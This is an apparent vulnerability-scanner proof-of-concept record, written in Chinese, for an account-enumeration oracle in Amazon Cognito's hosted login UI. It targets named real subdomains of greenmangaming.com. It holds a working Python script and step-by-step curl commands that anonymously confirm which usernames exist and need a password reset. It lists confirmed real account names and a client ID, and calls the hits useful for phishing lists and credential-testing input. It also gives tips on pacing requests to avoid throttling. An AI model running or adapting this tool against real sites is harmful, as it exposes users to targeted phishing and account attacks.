# Amazon Cognito hosted UI 用户名步骤路由 oracle：RESET_REQUIRED 账号匿名枚举（/login → /forgotPassword 差分 + 页面文案确认）

- **code**: cognito-hosted-ui-reset-required-account-enum-oracle
- **kind**: script
- **category**: info-leak
- **component**: Amazon Cognito hosted UI（托管登录页 / OAuth2 authorize 链）
- **severity**: low
- **language**: python
- **source**: manual
- **verified**: 1
- **verified_note**: task#6 / finding_id=140（finding_checks.verdict=verified，status=confirmed）。2026-11-11 17:40–18:01 UTC 在 ARTEX 执行机经平台记录代理实测：① 匿名 GET main.blog-mgmt 的 ALB 根路径 → 302 → Cognito /oauth2/authorize（client_id=61koj9fd0cfgvbst9vhbat98c9，state 由 ALB 生成）→ 302 /login，取得 csrf 与页面表单；② POST /login（csrf+username=staff）→ HTTP 302，Location=/forgotPassword?...；GET 该页 → HTTP 200 且正文精确包含「Invalid input: Password reset required for the user」；③ 阴性对照 username=zzqnotexist_5541@example.com → HTTP 302 Location=/verifyPassword?...，页面无任何错误文案；④ 入库前 18:01 UTC 用本条脚本复测 staff/steve/will-norris/administrator/info 五个账号全部 verdict=EXISTS_RESET_REQUIRED（matched=true，main 与 corp 两个 ALB 均复现）。判据成立：路由分叉 + 页面文案二者同时命中，且阴性对照无差异。
- **path**: pocs/cognito-hosted-ui-reset-required-account-enum-oracle/cognito_hosted_ui_enum.py
- **tags**: cognito,hosted-ui,username-enum,account-enum,reset-required,oracle,aws,alb,oauth2,forgotpassword,verifypassword,info-leak
- **created_at**: 2026-11-11T18:02:14.123Z
- **engine**: https://main.blog-mgmt.greenmangaming.com（同一 Cognito user pool/client 亦服务 corp.blog-mgmt.greenmangaming.com，两处均复现）
- **found_by**: vuln-scan

## 描述

Cognito 托管登录页（hosted UI）在「只提交用户名」这一步对账号状态做路由：RESET_REQUIRED 的账号被 302 到 /forgotPassword 并在页面回显「Invalid input: Password reset required for the user」，不存在的账号一律 302 到 /verifyPassword 且无文案。匿名即可批量判定账号存在性与重置态，绕过 Cognito 统一错误文案策略。前提：能触达前置 ALB/应用的 OAuth2 入口以拿到 authorize→login 链和会话 cookie；每个候选账号用全新会话。

## 用法

```
【前置】目标前面挂 ALB/OIDC 应用，匿名访问其根路径会 302 到 https://<domain>.auth.<region>.amazoncognito.com/oauth2/authorize?client_id=...&redirect_uri=...&state=...（redirect_uri 必须与 client 配置一致，所以不要自己拼，跟着 ALB 的 302 走）。必须带浏览器 UA，保持每步 cookie（cognito / page-data / XSRF-TOKEN）。

【命令】
python3 cognito_hosted_ui_enum.py https://main.<target> --users staff,steve,administrator
python3 cognito_hosted_ui_enum.py https://corp.<target> --users-file names.txt --delay 2
（--base 可显式指定 Cognito 域；默认从 ALB 302 自动发现）

【手工四步（等价）】
1) curl -sk -A "$UA" -D - https://<alb-host>/ -o /dev/null        # 拿 Location(authorize) + AWSALBAuthNonce
2) curl -sk -A "$UA" -c j -b j -D - "<authorize URL>" -o /dev/null  # 拿 Location(/login?...)
3) curl -sk -A "$UA" -c j -b j "<login URL>" -o login.html         # 取 <form action> 与 name=csrf value
4) curl -sk -A "$UA" -c j -b j -X POST "<base><form action>" \
     -H 'Content-Type: application/x-www-form-urlencoded' -H "Origin: <base>" -H "Referer: <login URL>" \
     --data-urlencode 'csrf=<csrf>' --data-urlencode 'username=<candidate>' --data 'cognitoAsfData=' -D -
   → Location=/forgotPassword 则 GET 该 Location，grep "Password reset required for the user"
   → Location=/verifyPassword 则本入口无结论（不存在账号与状态正常账号同路由）

【判据（三条缺一不可）】
① 用户名步骤 302 → /forgotPassword?...；
② GET /forgotPassword 200 且正文含 "Invalid input: Password reset required for the user"（页面会把该句重复两处，grep 一次即可）；
③ 阴性对照（随机不存在账号，如 zzqnotexist_<rand>@example.com）→ 302 /verifyPassword 且无同文案。
只满足 ① 不做 ② = 不可下结论。

【边界/别再浪费轮次】该 oracle 只给「存在 + RESET_REQUIRED」，拿不到会话：实测已确认账号均不可口令登录（/verifyPassword 统一 400 "Incorrect username or password."），注册关闭，token 端点强制 client secret（Bearer 直取 400 invalid_client），ALB /oauth2/idpresponse 用假 code 恒 401。命中后价值在定向钓鱼名单 / 凭据验证输入 / 用户名清单，而不是登录。

【失败常见原因】
- 直接用 IP 或错 Host 打 ALB → 403/无 302：必须用绑定该 ALB 的域名。
- 每步不共享 cookie → /login 表单 csrf 校验失败或 400；反之路由探测必须每个候选账号新建会话，避免状态串扰。
- 页面结构改版：找不到 name="csrf" 时先 dump /login 的 page-data JSON（新版托管 UI 部分参数在 cookie 的 base64 JSON 里），不要盲猜字段名。
- 直接构造 authorize URL 但 redirect_uri 与 client 注册值不一致 → Cognito 直接报错页，拿不到 /login。
- 频率过高会触发 Cognito 节流/验证码，间隔建议 ≥1.5s；批量前先用 1 个已知账号确认 oracle 仍成立（Cognito 可能修掉该路由差异）。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cognito hosted-UI 用户名步骤「路由 oracle」——枚举 RESET_REQUIRED 账号

用法:
  python3 cognito_hosted_ui_enum.py https://main.example.com --users staff,steve,jdoe
  python3 cognito_hosted_ui_enum.py https://corp.example.com --users-file names.txt --delay 1.5
  # 可选：--base https://<domain>.auth.<region>.amazoncognito.com   （默认从 ALB 302 自动发现）

判据（缺一不可）:
  1) POST /login 返回 302，Location 为 /forgotPassword?...        → 账号存在且处于 RESET_REQUIRED
  2) GET 该 /forgotPassword 页面 200 且正文含
     "Invalid input: Password reset required for the user"      → 存在性 + 状态被匿名确认
  3) 阴性对照: 不存在的用户名 → 302 /verifyPassword?... 且页面无该文案
"""
import argparse, html as H, json, os, re, sys, time
from urllib.parse import urljoin

import requests

UA = os.environ.get("ARTEX_UA", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
MARK = "Password reset required for the user"


def visible(html_text: str) -> str:
    t = re.sub(r"<script.*?</script>", "", html_text, flags=re.S | re.I)
    t = re.sub(r"<style.*?</style>", "", t, flags=re.S | re.I)
    t = re.sub(r"<[^>]+>", " ", t)
    return re.sub(r"\s+", " ", H.unescape(t)).strip()


def first_form(html_text: str):
    m = re.search(r'<form[^>]*method="post"[^>]*action="([^"]+)"', html_text, re.I) \
        or re.search(r'<form[^>]*action="([^"]+)"', html_text, re.I)
    csrf = re.search(r'name="csrf"\s+value="([^"]*)"', html_text)
    if not m:
        return None, None
    return H.unescape(m.group(1)), (csrf.group(1) if csrf else None)


def new_session():
    s = requests.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    })
    return s


def discover(host: str, base: str = None, timeout: int = 30):
    """ALB -> /oauth2/authorize -> /login。返回 (base, login_url, login_html, session)。"""
    s = new_session()
    r0 = s.get(host.rstrip("/") + "/", allow_redirects=False, timeout=timeout)
    loc0 = r0.headers.get("location")
    if not loc0:
        raise RuntimeError(f"ALB 未返回 302/Location（status={r0.status_code}），确认 Host 是正确的 ALB 域名")
    if not base:
        base = "https://" + re.match(r"https?://([^/]+)", loc0).group(1)
    r1 = s.get(loc0, allow_redirects=False, timeout=timeout)
    loc1 = r1.headers.get("location")
    if not loc1:
        raise RuntimeError(f"authorize 未跳转 login（status={r1.status_code}）")
    login_url = urljoin(base + "/", loc1)
    r2 = s.get(login_url, allow_redirects=False, timeout=timeout)
    return base, login_url, r2.text, s


def probe(host: str, user: str, base: str = None, delay: float = 1.5, timeout: int = 30) -> dict:
    out = {"host": host, "username": user}
    try:
        base, login_url, html_text, s = discover(host, base, timeout)
    except Exception as e:
        out.update(verdict="ERROR", detail=f"discover: {e}")
        return out
    action, csrf = first_form(html_text)
    if not action or not csrf:
        # 新版托管 UI 可能把表单参数放在 page-data JSON 里，先 dump 出来人工看
        out.update(verdict="ERROR", detail="未找到 form/csrf，页面结构可能改版")
        return out

    time.sleep(delay)
    r3 = s.post(urljoin(base + "/", action),
                data={"csrf": csrf, "username": user, "cognitoAsfData": ""},
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "Origin": base, "Referer": login_url},
                allow_redirects=False, timeout=timeout)
    loc = r3.headers.get("location", "")
    out["username_step"] = r3.status_code
    out["location_head"] = loc.split("?")[0] if loc else ""

    if "/forgotPassword" in loc:
        r4 = s.get(urljoin(base + "/", loc), allow_redirects=False, timeout=timeout)
        body = visible(r4.text)
        out.update(forgot_status=r4.status_code,
                   matched=(MARK in body),
                   snippet=body[body.find("Invalid input"):body.find("Invalid input") + 90] if "Invalid input" in body else body[:90])
        out["verdict"] = "EXISTS_RESET_REQUIRED" if MARK in body else "FORGOT_ROUTE_UNCONFIRMED"
    elif "/verifyPassword" in loc:
        out.update(verdict="NO_ORACLE_HIT",
                   note="不存在账号或状态正常账号都走这里，本入口无法区分")
    elif "/signup" in loc:
        out.update(verdict="NO_ORACLE_HIT", note="被路由到注册页（通常表示用户不存在）")
    else:
        out.update(verdict="NO_ORACLE_HIT", visible=visible(r3.text)[:200], status=r3.status_code)
    s.close()
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host", help="ALB / 应用域名，如 https://main.example.com")
    ap.add_argument("--users", default="", help="逗号分隔的用户名/邮箱")
    ap.add_argument("--users-file", default="", help="每行一个用户名")
    ap.add_argument("--base", default=None, help="Cognito 域（默认从 ALB 302 自动发现）")
    ap.add_argument("--delay", type=float, default=1.5, help="每次探测间隔秒")
    ap.add_argument("--timeout", type=int, default=30)
    a = ap.parse_args()

    users = [u for u in a.users.split(",") if u.strip()]
    if a.users_file:
        users += [l.strip() for l in open(a.users_file) if l.strip()]
    if not users:
        ap.error("需要 --users 或 --users-file")

    for u in users:
        print(json.dumps(probe(a.host, u, a.base, a.delay, a.timeout), ensure_ascii=False))
        time.sleep(a.delay)


if __name__ == "__main__":
    main()
```
